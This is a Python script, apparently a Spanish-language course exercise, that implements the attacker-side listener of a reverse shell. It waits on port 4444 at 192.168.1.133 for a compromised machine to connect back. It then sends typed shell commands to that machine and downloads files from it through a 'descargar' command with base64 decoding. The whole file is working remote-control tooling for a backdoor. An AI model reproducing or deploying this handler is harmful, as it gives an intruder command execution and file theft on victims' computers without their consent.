import socket
import json
from unittest import result
import base64

class Listener:

    def __init__(self,ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection,addres = listener.accept()
        print("[+] Tenemos una conexion de {}".format(addres))
        result = self.connection.recv(1024)
        print(result.decode("utf-8"))
    
    def envio_seguro(self,comando):
        json_data = json.dumps(comando)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        while True:

            try:
                json_data =json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
                
            except:
                continue

      
    def ejecutar_remoto(self,comando):
        self.envio_seguro(comando)
        
        if comando[0] == "salir":
            self.connection.close()
            exit()
            
        return self.reception_segura()
    
    def escribir_archivo(self,ruta,contenido):
        with open(ruta,"wb") as file:
            file.write(base64.b64decode(contenido))
            return "[+] Descarga completa!!"

    def run(self):
         while True:
            comando = input("shell $ ")
            comando = comando.split(" ")
            resultado = self.ejecutar_remoto(comando)
            if comando[0] == "descargar":
                resultado = self.escribir_archivo(comando[1],resultado)
            print("\n" + resultado)

escuchar = Listener("192.168.1.133",4444)

escuchar.run()
